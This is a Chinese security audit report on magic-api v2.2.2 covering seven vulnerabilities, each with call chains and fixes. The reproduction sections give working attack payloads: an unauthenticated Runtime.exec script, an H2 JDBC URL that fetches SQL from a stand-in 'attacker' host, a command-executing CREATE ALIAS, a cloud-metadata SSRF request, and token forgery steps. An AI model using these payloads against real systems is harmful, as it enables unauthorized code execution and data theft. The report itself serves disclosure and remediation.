# magic-api v2.2.2 — 漏洞详情

每个发现的完整描述、调用链、复现步骤与修复建议。严重级排序。

---

## F-01 — 默认配置下工作台完全无认证，导致未授权远程代码执行

**Severity:** CRITICAL  |  **Likelihood:** high  |  **Impact:** critical  |  **Confidence:** high

### 描述

magic-api 在默认（零配置）下，工作台（/magic/web 及其下所有 REST 接口）不需要任何身份认证即可访问。DefaultAuthorizationInterceptor 构造器仅在 username 与 password 同时非 null 时把内部 requireLogin 置为 true；Security.java 的 username/password 字段默认为 null，因此 requireLogin() 返回 false。MagicWebRequestInterceptor.handle 中的判断为 if (validRequiredLogin && requiredLogin)，requiredLogin 为 false 时直接跳过 token 校验；随后调用的 doValid(request, valid) 在 valid == null（大量接口未标注 @Valid）时直接 return，在 valid != null 时又依赖 MagicController.allowVisit，而 AuthorizationInterceptor.allowVisit 的默认实现恒返回 true。结果：/resource/file/{folder}/save、/resource/delete、/upload、/datasource/jdbc/test、/backup 等全部写/敏感接口在未认证状态下可达。工作台保存的脚本通过 ScriptManager.executeScript 编译执行，magic-script 的 MagicResourceLoader 静态初始化块默认 addPackage("java.lang.*") 与 addPackage("java.util.*")，脚本可 import 任意类、new 任意对象并反射调用任意方法。攻击者只需通过 HTTP 创建一个返回命令执行结果的脚本并访问该脚本对应的接口路径，即可在服务器进程内执行任意 Java/系统命令。这是该组件最常见的在野利用形态。

### 根因

DefaultAuthorizationInterceptor 与 MagicWebRequestInterceptor 在 security.username/password 未配置时不做任何认证与授权检查，导致工作台写接口可被未授权访问并通过 magic-script 执行任意代码。

### 预期行为

magic-api 期望开发者在 application.yml 中设置 magic-api.security.username 和 magic-api.security.password（或通过 AuthorizationInterceptor SPI 接入自身权限体系）来保护工作台；@Valid 注解与 Authorization 枚举本应起到操作级别权限控制作用，未配置时不应开放写接口。

### 利用前提

- [system_configuration] magic-api.web 已配置（官方 README 与示例均默认开启工作台 UI），且 magic-api.security.username/password 未设置（默认 null）。
- [authentication_level] 无需任何身份认证（默认）。
- [network_routing] 攻击者可网络访问应用 HTTP 端口。

### 调用链

1. [entrypoint] `magic-api/src/main/java/org/ssssssss/magicapi/core/web/MagicResourceController.java:73` `saveFile` — @PostMapping("/resource/file/{folder}/save") 创建/保存脚本资源，方法未标注 @Valid。
2. [propagation] `magic-api/src/main/java/org/ssssssss/magicapi/core/interceptor/MagicWebRequestInterceptor.java:34` `handle` — requiredLogin = authorizationInterceptor.requireLogin() 返回 false（默认未配置凭证）。
3. [propagation] `magic-api/src/main/java/org/ssssssss/magicapi/core/interceptor/DefaultAuthorizationInterceptor.java:21` `DefaultAuthorizationInterceptor` — 构造器 if (this.requireLogin = username != null && password != null)：Security.java 中两字段默认 null，requireLogin=false。
4. [propagation] `magic-api/src/main/java/org/ssssssss/magicapi/core/interceptor/MagicWebRequestInterceptor.java:36` `handle` — if (validRequiredLogin && requiredLogin) 因 requiredLogin=false 被跳过；第 39 行调用 doValid(request, null)。
5. [propagation] `magic-api/src/main/java/org/ssssssss/magicapi/core/web/MagicController.java:42` `doValid` — valid == null 时整个 if 块被跳过，无任何权限检查；即使 valid != null，第 47 行的 allowVisit 走默认实现恒返回 true。
6. [propagation] `magic-api/src/main/java/org/ssssssss/magicapi/core/web/MagicResourceController.java:96` `saveFile` — allowVisit(request, Authorization.SAVE, entity)（第 85 行）恒为 true，service.saveFile(entity) 把攻击者提供的脚本持久化。
7. [sink] `magic-api/src/main/java/org/ssssssss/magicapi/utils/ScriptManager.java:21` `executeScript` — MagicScript.create(script, null).execute(context) 编译执行保存的 magic-script；magic-script 可 import 任意 Java 类，达成任意代码执行。

### 复现

**攻击者视角：** 网络可达的未认证远程攻击者，仅能访问应用 HTTP 端口。

**步骤：**

1. 探测工作台：GET /magic/config.json。
2. POST /magic/resource/file/{已存在 groupId}/save，参数 path=随机名、method=GET，Body 为 magic-script（执行命令/读文件）。
3. GET /magic/resource 确认接口已注册并获取其完整 path。
4. GET /<prefix>/<随机路径> 触发脚本执行，读取响应。

**Payload：**

```
POST /magic/resource/file/{groupId}/save?path=/pwn&method=GET，Body 为 magic-script：import java.lang.Runtime; return new java.lang.String(Runtime.getRuntime().exec(new String[]{"/bin/sh","-c","id"}).getInputStream().readAllBytes(), "UTF-8");
GET /<prefix>/pwn —— 触发脚本执行
探测：GET /magic/config.json 返回 JSON 即工作台开放
```

**预期结果：** 响应体返回命令 stdout（uid=...），证明服务器进程内任意代码执行；可进一步读写配置、拖库、横向移动。

### 评级理由

- Likelihood (high): 默认配置（magic-api.security.username/password 未设置）下 requireLogin() 返回 false，工作台所有写接口对任意网络可达者开放；无需凭证、无需用户交互。
- Impact (critical): magic-script 通过 MagicResourceLoader 默认导入 java.lang.* 与 java.util.*，脚本可 import/new 任意类并反射调用，等同 JVM 内任意代码执行（Runtime.exec / ProcessBuilder），完全控制宿主与后端数据。
- Confidence (high): 认证旁路逻辑在 MagicWebRequestInterceptor.handle 与 DefaultAuthorizationInterceptor 构造器中可直接读到；脚本执行原语为产品设计核心功能，路径唯一且无其他守卫。未动态构建运行环境（本机仅有 JDK17，工程 target 1.8），结论基于完整调用链静态验证。

### 修复建议

改变默认策略：未配置凭证时禁用工作台写接口并 WARN；@Valid 缺省时仍强制认证；AuthorizationInterceptor.allowVisit 默认最小权限；生产环境配合网络隔离与反向代理认证。

`magic-api/src/main/java/org/ssssssss/magicapi/core/interceptor/MagicWebRequestInterceptor.java`

```java
boolean validRequiredLogin = (valid == null || valid.requireLogin());
if (validRequiredLogin && requiredLogin) {
	request.setAttribute(Constants.ATTRIBUTE_MAGIC_USER, authorizationInterceptor.getUserByToken(request.getHeader(Constants.MAGIC_TOKEN_HEADER)));
} else if (validRequiredLogin) {
	// 未配置认证时拒绝所有管理接口
	throw new MagicLoginException("工作台未启用认证，拒绝访问");
}
```


---

## F-02 — 未认证 JDBC 连接测试接口导致 SSRF，可在存在可利用驱动时升级为 RCE

**Severity:** HIGH  |  **Likelihood:** high  |  **Impact:** critical  |  **Confidence:** high

### 描述

MagicDataSourceController.test（POST/GET /datasource/jdbc/test）把请求体 DataSourceInfo 的 driverClassName、url、username、password 原样交给 JdbcUtils.getConnection。方法上没有 @Valid 注解、方法体内也不调用 allowVisit，默认配置（security.username/password 未设置）下任何网络可达者都可调用；即使配置了凭证，该接口也只受登录校验约束，任何登录用户均可使用，无角色区分。JdbcUtils.getConnection 先 Class.forName(driver)（driver 为空时从 url 前缀推导），再 DriverManager.getConnection(url, username, password)。url 与 driver 完全由攻击者指定：(1) SSRF——对内网任意 host:port 发起带 jdbc: 协议语义的 TCP 连接，连接失败信息（"获取Jdbc链接失败：..."）回显给攻击者，可做内网测绘；(2) RCE——H2 可用 ;INIT=RUNSCRIPT FROM 'http://attacker/x.sql' 执行任意 SQL，CREATE ALIAS 注入 Java 代码执行系统命令；旧版 mysql-connector-java 可用 autoDeserialize/queryInterceptors 参数连攻击者 MySQL 服务完成反序列化 RCE 或任意文件读取。Class.forName(driver) 亦会触发任意 classpath 类的静态初始化器，构成额外副作用面。

### 根因

MagicDataSourceController.test 未校验/限制 DataSourceInfo 的 driverClassName 与 url，允许攻击者用任意 JDBC 驱动连接任意地址。

### 预期行为

该接口服务于工作台"测试数据源连接"功能，应只允许被授权用户（且通常为管理员）测试其自有数据源，并对驱动类与 URL 做白名单/同源限制。

### 利用前提

- [authentication_level] 默认配置无需认证；即便配置了凭证，该接口也无权限校验（任何登录用户均可调用）。
- [third_party_dependency] RCE 子路径依赖宿主 classpath 存在可被 JDBC URL 利用的驱动（H2、旧版 mysql-connector-java 等）；SSRF 子路径无此依赖。
- [network_routing] 攻击者可访问应用 HTTP 端口；SSRF 目标可达性与内网拓扑相关。

### 调用链

1. [entrypoint] `magic-api/src/main/java/org/ssssssss/magicapi/datasource/web/MagicDataSourceController.java:23` `test` — @RequestMapping("/datasource/jdbc/test")，@RequestBody DataSourceInfo；无 @Valid、无 allowVisit 调用。
2. [propagation] `magic-api/src/main/java/org/ssssssss/magicapi/core/interceptor/MagicWebRequestInterceptor.java:36` `handle` — valid == null 且 requiredLogin == false（默认）→ 不取用户、不鉴权，直接放行到控制器方法。
3. [propagation] `magic-api/src/main/java/org/ssssssss/magicapi/datasource/web/MagicDataSourceController.java:25` `test` — JdbcUtils.getConnection(properties.getDriverClassName(), properties.getUrl(), properties.getUsername(), properties.getPassword())，四个参数全部来自请求体。
4. [propagation] `magic-api/src/main/java/org/ssssssss/magicapi/utils/JdbcUtils.java:25` `getConnection` — Class.forName(driver)：driver 来自请求体，可加载任意 classpath 类并触发其静态初始化器。
5. [sink] `magic-api/src/main/java/org/ssssssss/magicapi/utils/JdbcUtils.java:30` `getConnection` — DriverManager.getConnection(url, username, password)：url 完全由攻击者控制，发起任意 JDBC 连接（SSRF/JDBC-URL 攻击），结果消息回显。

### 复现

**攻击者视角：** 未认证远程攻击者，可访问应用 HTTP 端口。

**步骤：**

1. 确认 /magic/config.json 可达（工作台开放）。
2. POST /magic/datasource/jdbc/test，Body 携带目标 JDBC URL，观察响应 code/data 中的回显，进行内网探测。
3. 若探测到 H2/旧版驱动，改用上述 RCE payload，RUNSCRIPT 从攻击者 HTTP 服务拉取 SQL 并执行。

**Payload：**

```
POST /magic/datasource/jdbc/test {"url":"jdbc:mysql://10.0.0.5:3306/x","username":"a","password":"b"} —— 按回显差异探测内网
POST /magic/datasource/jdbc/test {"driverClassName":"org.h2.Driver","url":"jdbc:h2:mem:t;INIT=RUNSCRIPT FROM 'http://attacker/e.sql'","username":"sa","password":""}
e.sql：CREATE ALIAS EXEC AS 'String r() throws Exception { return java.util.Arrays.toString(java.lang.Runtime.getRuntime().exec(new String[]{"/bin/sh","-c","id"}).getInputStream().readAllBytes()); }'; CALL EXEC();
```

**预期结果：** SSRF：响应 data 含 "获取Jdbc链接失败：..." 且随目标端口开放与否变化；RCE：H2 场景下攻击者 HTTP 收到 RUNSCRIPT 请求且 SQL 执行成功（命令输出可经由二次外带或查询返回获取）。

### 评级理由

- Likelihood (high): /datasource/jdbc/test 未标注 @Valid 且未调用 allowVisit，默认配置下完全无需认证；只需一个 POST + JSON 请求体。
- Impact (critical): driver/url/username/password 全部由请求体控制，DriverManager.getConnection(url) 形成完整 JDBC-URL 攻击面：H2 INIT=RUNSCRIPT 可执行任意 SQL（CREATE ALIAS 可执行 Java），旧版 mysql-connector-java 可反序列化攻击者服务器返回的 payload，均可达 RCE；即使无可利用驱动，仍是稳定内网端口/服务探测的 SSRF 原语。
- Confidence (high): 接口完全信任请求体、无任何过滤；可达性由默认无认证保证（见 F1 调用链）。RCE 子路径依赖部署方 classpath 引入的驱动（H2/旧版 mysql-connector），SSRF 子路径无依赖、确定性高。未动态验证，结论基于完整调用链静态确认。

### 修复建议

接口加 @Valid(authorization=...) 并调用 allowVisit；对 driverClassName 做白名单、对 url 强制限定到已配置数据源主机/端口或直接移除自由连接能力（改为仅测试预配置数据源）；错误信息不回显内网细节。

`magic-api/src/main/java/org/ssssssss/magicapi/datasource/web/MagicDataSourceController.java`

```java
@RequestMapping("/datasource/jdbc/test")
@ResponseBody
@Valid(authorization = Authorization.SAVE)
public JsonBean<String> test(@RequestBody DataSourceInfo properties, MagicHttpServletRequest request) {
	isTrue(allowVisit(request, Authorization.SAVE), PERMISSION_INVALID);
	isTrue(JdbcUtils.isAllowedDriver(properties.getDriverClassName()), PERMISSION_INVALID);
	isTrue(JdbcUtils.isAllowedUrl(properties.getUrl()), PERMISSION_INVALID);
	... // 其余不变
}
```


---

## F-03 — 未认证读取全部 API 脚本源码（/resource/file/{id}、/search）泄露业务逻辑与嵌入凭证

**Severity:** HIGH  |  **Likelihood:** high  |  **Impact:** high  |  **Confidence:** high

### 描述

MagicResourceController.detail（GET /resource/file/{id}）返回 MagicEntity 实体，其中包含完整 magic-script 源码；/resource 树接口可枚举全部文件 id，/search 可按关键字全量检索脚本内容。这些方法虽调用了 allowVisit(request, Authorization.VIEW, entity)，但 AuthorizationInterceptor.allowVisit 默认实现恒返回 true，且在默认配置（未设置 security.username/password）下连登录校验都不存在。因此未认证攻击者可以：GET /magic/resource 列出分组与文件 → GET /magic/resource/file/{id} 逐个读取脚本全文。脚本中经常硬编码数据源连接串、内网服务地址、第三方 API key（低代码平台的常见用法），泄露后可直接用于横向移动。/backups 与 /backup?timestamp=..&id=.. 亦能取到全部脚本内容（见 F4）。/classes、/classes.txt（requireLogin=false）进一步暴露全量 classpath，辅助构造利用链。

### 根因

MagicResourceController.detail 依赖默认恒真的 allowVisit 且无登录强制，导致脚本源码可未授权读取。

### 预期行为

脚本源码属于受保护的配置资产，应仅允许具备 VIEW 权限的已认证用户读取；VIEW 默认应拒绝而非放行。

### 利用前提

- [system_configuration] magic-api.web 已配置且 security.username/password 未设置（默认）。
- [authentication_level] 无需认证。

### 调用链

1. [entrypoint] `magic-api/src/main/java/org/ssssssss/magicapi/core/web/MagicResourceController.java:102` `detail` — GET /resource/file/{id}，@PathVariable id 为攻击者可控的资源 id。
2. [propagation] `magic-api/src/main/java/org/ssssssss/magicapi/core/web/MagicController.java:64` `allowVisit` — allowVisit(request, Authorization.VIEW, entity) → AuthorizationInterceptor.allowVisit 默认实现恒返回 true（AuthorizationInterceptor.java:66 default return true）。
3. [propagation] `magic-api/src/main/java/org/ssssssss/magicapi/core/resource/DefaultMagicResourceService.java:1` `file` — service.file(id) 从存储层取出 MagicEntity（含 script 字段全文）。
4. [sink] `magic-api/src/main/java/org/ssssssss/magicapi/core/web/MagicResourceController.java:107` `detail` — return new JsonBean<>(entity) —— 完整脚本源码随响应返回给未认证请求者。

### 复现

**攻击者视角：** 未认证远程攻击者。

**步骤：**

1. GET /magic/resource 获取资源树与全部 id。
2. 逐个 GET /magic/resource/file/{id} 下载脚本。
3. POST /magic/search keyword=password/secret/jdbc 检索敏感内容。

**Payload：**

```
GET /magic/resource —— 列出全部分组与文件（含 id）
GET /magic/resource/file/{id} —— 读取该 API 完整脚本
POST /magic/search  form: keyword=password —— 全文检索疑似凭证
```

**预期结果：** 响应包含 magic-script 全文；命中硬编码凭证/内网地址时即可用于后续攻击。

### 评级理由

- Likelihood (high): 接口默认无认证（同 F1），/resource 树接口仅需一个 GET；id 可通过 /resource 树与 /backups 枚举获得。
- Impact (high): 返回完整 magic-script 源码，实践上常含内网地址、账号口令、SQL 与第三方 key；为 F1/F2 之外的独立信息泄露与后续利用放大器。
- Confidence (high): detail 方法直接返回 service.file(id) 实体（含 script 字段），allowVisit 默认实现恒 true，代码路径短且无其他守卫；file/id 枚举经 /resource 与 /backup/{id} 双通道确认。未动态验证。

### 修复建议

与 F1 一并修复认证缺省；对导出/明细接口强制 VIEW 授权；考虑对脚本内容做敏感信息扫描告警；日志/审计记录读取行为。

`magic-api/src/main/java/org/ssssssss/magicapi/core/interceptor/AuthorizationInterceptor.java`

```java
default boolean allowVisit(MagicUser magicUser, MagicHttpServletRequest request, Authorization authorization) {
	return magicUser != null; // 默认要求登录态，角色细分交由实现方
}
```


---

## F-04 — 未认证备份导出与全量回滚：可读全部脚本并可覆写工作区

**Severity:** HIGH  |  **Likelihood:** high  |  **Impact:** high  |  **Confidence:** high

### 描述

MagicBackupController 暴露 /backups（列出全部备份时间戳与元信息）、/backup/{id}（按 id 列出备份）、/backup?timestamp=&id=（返回该备份的脚本正文，第 85 行 entity.getScript()）、/backup/rollback（回滚）。这些方法既没有 @Valid 注解，方法体也不调用 allowVisit，因此在默认配置（未设置 security.username/password）下完全无需认证即可访问。影响有两点：(1) 信息泄露——/backup 返回任意历史版本的脚本源码，比 F3 更彻底（全版本历史，含已删除脚本与早期可能暴露的凭证）；(2) 破坏性改写——/backup/rollback 在 id=full 时先 service.doBackupAll（当前状态再备份一次）再调用 magicAPIService.upload(backupContent, FULL)，而 DefaultMagicResourceService.upload(full=true) 会先 root.delete() 删除整个工作区再写入备份内容，相当于攻击者可用任一历史备份（通常还包含其此前注入的恶意脚本，见 F1）覆盖现网所有 API，实现持久化后门或拒绝服务。即使 id 非 full，也可逐实体用历史内容覆盖回写。

### 根因

MagicBackupController 的备份读取与回滚接口缺乏认证与授权，允许未授权者导出全版本脚本并覆写工作区。

### 预期行为

备份/回滚属于高敏感运维操作，应仅允许管理员角色在登录态下执行，且回滚应二次确认；读取也应受 VIEW 授权约束。

### 利用前提

- [system_configuration] magic-api.backup 已配置（启用备份服务），security.username/password 未设置（默认）。
- [authentication_level] 无需认证。

### 调用链

1. [entrypoint] `magic-api/src/main/java/org/ssssssss/magicapi/backup/web/MagicBackupController.java:79` `backup` — GET /backup?timestamp=&id=，无 @Valid、无 allowVisit 调用。
2. [propagation] `magic-api/src/main/java/org/ssssssss/magicapi/core/interceptor/MagicWebRequestInterceptor.java:36` `handle` — valid==null 且 requiredLogin==false（默认）→ 直接放行。
3. [propagation] `magic-api/src/main/java/org/ssssssss/magicapi/backup/web/MagicBackupController.java:83` `backup` — service.backupInfo(id, timestamp) 取出历史备份实体。
4. [sink] `magic-api/src/main/java/org/ssssssss/magicapi/backup/web/MagicBackupController.java:85` `backup` — return new JsonBean<>(entity.getScript()) —— 返回历史脚本正文给未授权者；rollback 路径（第 53-58 行）则以 FULL 模式覆写工作区。

### 复现

**攻击者视角：** 未认证远程攻击者。

**步骤：**

1. GET /magic/backups 枚举备份。
2. GET /magic/backup?timestamp=&id= 下载脚本。
3. （破坏性）POST /magic/backup/rollback 触发工作区覆盖。

**Payload：**

```
GET /magic/backups —— 列出全部备份 id 与 timestamp
GET /magic/backup?timestamp=1700000000000&id=full —— 读取全量历史脚本
POST /magic/backup/rollback id=full&timestamp=1700000000000 —— 以历史备份覆盖现网（FULL 删除+写入）
```

**预期结果：** 返回历史脚本明文；rollback 成功则现网 API 被历史内容替换。

### 评级理由

- Likelihood (high): MagicBackupController 所有方法均无 @Valid、也不调用 allowVisit，默认配置下完全无需认证；/backup 与 /backups 仅一个 GET 即可调用。
- Impact (high): 可读取任意历史备份的完整脚本内容（同 F3 但覆盖全部版本历史，可能含已删除/隐藏的凭证）；/backup/rollback 以 mode=full 时直接以历史备份内容覆写当前工作区（先全量删除再写入），是持久化篡改/植入后门/破坏可用性手段。
- Confidence (high): 控制器方法无注解、无 allowVisit，可达性由默认无认证保证；rollback 内 service.doBackupAll + magicAPIService.upload(FULL) 明确完成"全删+全写"。未动态验证。

### 修复建议

备份控制器所有方法加 @Valid(authorization=...) 并调用 allowVisit；回滚需管理员授权 + 二次确认；导出接口同样受控。结合 F1 修复默认认证。

`magic-api/src/main/java/org/ssssssss/magicapi/backup/web/MagicBackupController.java`

```java
@GetMapping("/backup")
@ResponseBody
@Valid(authorization = Authorization.BACKUP)
public JsonBean<String> backup(Long timestamp, String id, MagicHttpServletRequest request) {
	isTrue(allowVisit(request, Authorization.BACKUP), PERMISSION_INVALID);
	...
```


---

## F-05 — 工作台 /push 接口允许 SSRF：攻击者控制 RestTemplate 发出的请求目标地址

**Severity:** MEDIUM  |  **Likelihood:** medium  |  **Impact:** high  |  **Confidence:** high

### 描述

MagicWorkbenchController.push（POST /push，@Valid(authorization=Authorization.PUSH)）读取请求头 magic-push-target 与 magic-push-secret-key，交由 DefaultMagicAPIService.push，该方法创建 RestTemplate 并对 target（header 值）发起 POST 请求（携带 selected resources 的序列化内容与签名）。target 完全由攻击者指定，无任何白名单/同源/内网校验，形成典型 SSRF。默认配置下 allowVisit 恒 true、requiredLogin 为 false，无需任何认证；即使配置了凭证也仅需登录态，无细粒度权限限制。除 HTTP 端口探测外，可针对内部服务（数据库控制台、内部 API、云元数据服务）发送 POST，可触发内部状态变更或泄露响应内容（RestTemplate 的返回值 JsonBean 回传给了客户端）。

### 根因

DefaultMagicAPIService.push 接受任意 HTTP URL 作为 POST 目标，未做同源或白名单校验。

### 预期行为

/push 用于将当前工作区内容推送到同一 magic-api 实例集群内的其他节点（target 为配置文件中约定的可达地址），应限制为白名单/预配置地址。

### 利用前提

- [system_configuration] magic-api.web 已配置且工作台开放。
- [authentication_level] 默认无需认证。

### 调用链

1. [entrypoint] `magic-api/src/main/java/org/ssssssss/magicapi/core/web/MagicWorkbenchController.java:319` `push` — @RequestMapping("/push")，target 来自 @RequestHeader("magic-push-target")。
2. [propagation] `magic-api/src/main/java/org/ssssssss/magicapi/core/web/MagicWorkbenchController.java:326` `push` — magicAPIService.push(target, secretKey, mode, resources)，target 直接传递。
3. [propagation] `magic-api/src/main/java/org/ssssssss/magicapi/core/service/impl/DefaultMagicAPIService.java:156` `push` — RestTemplate restTemplate = new RestTemplate() —— 无任何拦截器限制目标。
4. [sink] `magic-api/src/main/java/org/ssssssss/magicapi/core/service/impl/DefaultMagicAPIService.java:174` `push` — restTemplate.postForObject(target, new HttpEntity<>(param, headers), JsonBean.class) —— 向任意 URL 发 POST，返回值传回客户端。

### 复现

**攻击者视角：** 未认证远程攻击者（默认）或任意登录用户。

**步骤：**

1. POST /magic/push，设置 magic-push-target 为内网/云元数据地址，观察响应中 RestTemplate 返回的内容或错误信息差异。

**Payload：**

```
POST /magic/push  Headers: magic-push-target=http://169.254.169.254/latest/meta-data/, magic-push-secret-key=anything, magic-push-mode=SINGLE  Body: []
POST /magic/push  Headers: magic-push-target=http://内网IP:端口/内部接口, ...  Body: 任意 JSON
```

**预期结果：** 若 target 可达，响应 JSON 包含目标返回的内容（信息泄露）；若不可达，响应含连接错误（端口/主机探测）。

### 评级理由

- Likelihood (medium): 默认配置无需认证，POST + 两个 header 即可；若配置了凭证则需登录态，使用门槛略高。
- Impact (high): 服务器使用 RestTemplate 对攻击者指定的任意 HTTP URL 发起 POST，可穿透内部网络、探测云元数据（169.254.169.254）、对内部服务发出带（旧版备份内容）body 的请求，扩大攻击面。
- Confidence (high): DefaultMagicAPIService.push 第 174 行 RestTemplate.postForObject(target, ...) 明确使用 magic-push-target header 值作为目标 URL，无任何校验；可达性由认证旁路保证。

### 修复建议

target 限制为预配置地址白名单，移除从 header 读取 target 的设计；或至少校验 target 为集群内地址并禁止访问元数据/loopback。

`magic-api/src/main/java/org/ssssssss/magicapi/core/service/impl/DefaultMagicAPIService.java`

```java
public JsonBean<?> push(String target, String secretKey, String mode, List<SelectedResource> resources) {
	isTrue(configuration.getPushTargets().contains(target), PUSH_TARGET_NOT_ALLOWED);
	...
```


---

## F-06 — 认证令牌为无盐静态 MD5、永不过期、登出无失效

**Severity:** MEDIUM  |  **Likelihood:** medium  |  **Impact:** high  |  **Confidence:** high

### 描述

启用默认认证后（security.username/password 同时非 null），DefaultAuthorizationInterceptor 在构造器中计算 validToken = MD5(username + "||" + password)，该值即唯一 token；getUserByToken 仅做 Objects.equals(validToken, token) 等值比较（非常量时间，可侧信道，实际风险低）。无过期机制、无刷新机制（AuthorizationInterceptor.refreshToken 默认空实现）、logout(token) 默认为空方法体（MagicWorkbenchController /logout 调用后 token 依旧有效），token 一旦泄露即永久有效直至服务重启且集成方未自定义实现。同时 login 接口无速率限制/锁定，弱口令可暴力枚举。token 经 Magic-Token 响应头下发（配合 CORS 反射 Origin，见 F8）。

### 根因

DefaultAuthorizationInterceptor 使用可离线重算的无盐 MD5 作为静态令牌且不实现登出失效与过期。

### 预期行为

token 应为随机值、与会话绑定、可撤销、有过期时间；login 应有速率限制。

### 利用前提

- [system_configuration] 集成方配置了 security.username/password（默认认证路径）。
- [authentication_level] 需要一次合法登录或知晓凭证材料。

### 调用链

1. [entrypoint] `magic-api/src/main/java/org/ssssssss/magicapi/core/web/MagicWorkbenchController.java:145` `login` — @PostMapping("/login")，username/password 为攻击者可控参数。
2. [propagation] `magic-api/src/main/java/org/ssssssss/magicapi/core/interceptor/DefaultAuthorizationInterceptor.java:42` `login` — MD5Utils.encrypt(String.format("%s||%s", username, password)) 与 validToken 比较——token 空间完全由两个弱熵字段决定。
3. [propagation] `magic-api/src/main/java/org/ssssssss/magicapi/core/interceptor/AuthorizationInterceptor.java:54` `logout` — default void logout(String token) {} 空实现，登出不做任何失效处理。
4. [sink] `magic-api/src/main/java/org/ssssssss/magicapi/core/interceptor/DefaultAuthorizationInterceptor.java:34` `getUserByToken` — if (requireLogin && Objects.equals(validToken, token)) return configMagicUser —— 静态 token 永久有效。

### 复现

**攻击者视角：** 已获得一次 token 的攻击者，或可暴力枚举弱口令的攻击者。

**步骤：**

1. 对 /magic/login 进行弱口令枚举（无速率限制）。
2. 或从日志/响应头获得一次 token 后长期复用，logout 不产生失效。

**Payload：**

```
POST /magic/login  username=admin&password=admin123 —— 响应头 Magic-Token 返回静态 token
python3 -c "import hashlib;print(hashlib.md5(b'admin||admin123').hexdigest())" —— 离线重算 token
GET /magic/resource  Header: Magic-Token: <token> —— 持续重放
```

**预期结果：** 拿到 Magic-Token 后可在服务重启前无限期访问全部工作台接口。

### 评级理由

- Likelihood (medium): 仅在集成方配置了 magic-api.security.username/password 时该认证路径才启用；此时 token 完全由两个公开格式化的字段拼接 MD5 得到。
- Impact (high): 知道用户名+口令即可离线算出 token；token 泄露后无失效手段（logout 为空实现、无过期时间），可在密码轮换前持续重放；等价于长期访问凭证。
- Confidence (high): DefaultAuthorizationInterceptor 构造器/ login/getUserByToken/logout 逻辑直接可读；AuthorizationInterceptor 接口默认 logout 为空方法体。

### 修复建议

token 改为服务端随机生成并存储（带过期时间），logout 真正失效 token，login 增加速率限制；或引导集成方实现 AuthorizationInterceptor 接入已有身份体系。

`magic-api/src/main/java/org/ssssssss/magicapi/core/interceptor/DefaultAuthorizationInterceptor.java`

```java
public MagicUser login(String username, String password) throws MagicLoginException {
	if (requireLogin && Objects.equals(MD5Utils.encrypt(String.format("%s||%s", username, password)), this.validToken)) {
		this.validToken = UUID.randomUUID().toString(); // 每次登录生成随机 token
		this.expiredAt = System.currentTimeMillis() + TTL;
		this.configMagicUser = new MagicUser(username, username, this.validToken);
		return configMagicUser;
	}
	throw new MagicLoginException("用户名或密码不正确");
}
@Override
public void logout(String token) {
	if (Objects.equals(this.validToken, token)) { this.validToken = null; }
}
```


---

## F-07 — 推送接收接口签名无时效校验，可重放实现工作区整体替换

**Severity:** MEDIUM  |  **Likelihood:** low  |  **Impact:** high  |  **Confidence:** high

### 描述

当配置了 magic-api.secret-key 时，MagicAPIAutoConfiguration 注册 POST /_magic-api-sync（pushPath 可配置）→ MagicWorkbenchController.receivePush。该方法校验 timestamp、mode、sign 非空，然后 sign.equals(SignUtils.sign(timestamp, secretKey, mode, bytes))，其中 SignUtils.sign = MD5(timestamp|mode|MD5(bytes)|secretKey)。**没有任何 timestamp 新鲜度检查**——一个被截获的合法推送请求（或其中间人/日志/代理留存）可被无限次重放，服务器每次都会执行 magicAPIService.upload(bytes, mode)，mode=FULL 时 DefaultMagicResourceService.upload(full=true) 先 root.delete() 清空全部 API 再写入攻击者重放的旧内容（其中可能包含 F1 注入的恶意脚本），造成配置回滚、后门持久化或服务破坏。签名材料中 secretKey 是唯一熵源，若 secretKey 弱（短/可猜）还可离线伪造任意推送。

### 根因

MagicWorkbenchController.receivePush 只验证签名等值而未验证 timestamp 新鲜度，允许重放历史推送请求。

### 预期行为

该接口用于集群节点间同步 API 定义，签名本应绑定时间戳并拒绝过期请求以防止重放。

### 利用前提

- [system_configuration] magic-api.secret-key 已配置（否则 receivePush 不注册）。
- [data_state] 攻击者需获得一次合法推送请求（网络截获、日志、代理缓存等）。

### 调用链

1. [entrypoint] `magic-api/src/main/java/org/ssssssss/magicapi/core/web/MagicWorkbenchController.java:331` `receivePush` — POST /_magic-api-sync（multipart），参数 file/mode/timestamp/sign，@Valid(requireLogin=false)。
2. [propagation] `magic-api/src/main/java/org/ssssssss/magicapi/core/web/MagicWorkbenchController.java:337` `receivePush` — isTrue(sign.equals(SignUtils.sign(timestamp, secretKey, mode, bytes)), SIGN_IS_INVALID) —— 无 timestamp 与当前时间差校验。
3. [propagation] `magic-api/src/main/java/org/ssssssss/magicapi/utils/SignUtils.java:9` `sign` — MD5(timestamp|mode|MD5(bytes)|secretKey)，历史请求的 (timestamp,mode,bytes,sign) 组合永远有效。
4. [sink] `magic-api/src/main/java/org/ssssssss/magicapi/core/web/MagicWorkbenchController.java:342` `receivePush` — magicAPIService.upload(new ByteArrayInputStream(bytes), mode) —— FULL 模式清空并替换整个工作区。

### 复现

**攻击者视角：** 能截获/读取一次节点间推送流量的中间人或日志读取者。

**步骤：**

1. 截获一次合法推送（或从日志/代理获取）。
2. 原样重放 POST 请求，服务器接受并执行 upload(FULL)。

**Payload：**

```
重放完整 multipart POST /_magic-api-sync（timestamp、mode=FULL、sign、file 均用截获值）
```

**预期结果：** 工作区被回滚为截获时的内容（全量删除+写入），重复重放可持续压制；可用性破坏与后门持久化。

### 评级理由

- Likelihood (low): 仅当集成方配置 magic-api.secret-key（非空）时 receivePush 才注册；且攻击者需先截获一次合法推送流量（含 timestamp+sign）。
- Impact (high): 重放历史合法推送包即可以 FULL 模式删除并替换整个工作区；配合 F1/F3 获取的旧脚本内容亦可构造签名（secretKey 除外），但签名依赖 secretKey，纯重放即可造成可用性破坏。
- Confidence (high): receivePush 源码明确仅做 sign.equals(SignUtils.sign(timestamp, secretKey, mode, bytes)) 等值校验，未比较 timestamp 与当前时间；SignUtils.sign 结构可读。

### 修复建议

校验 timestamp 与服务器时间差（如 ±5 分钟）并缓存已见 sign 防重放；对 secretKey 长度/复杂度做强制校验。

`magic-api/src/main/java/org/ssssssss/magicapi/core/web/MagicWorkbenchController.java`

```java
isTrue(Math.abs(System.currentTimeMillis() - timestamp) < TimeUnit.MINUTES.toMillis(5), SIGN_IS_INVALID);
isTrue(seenSigns.addIfAbsent(sign), SIGN_IS_INVALID); // 例如 Caffeine/Set + TTL
isTrue(sign.equals(SignUtils.sign(timestamp, secretKey, mode, bytes)), SIGN_IS_INVALID);
```


---

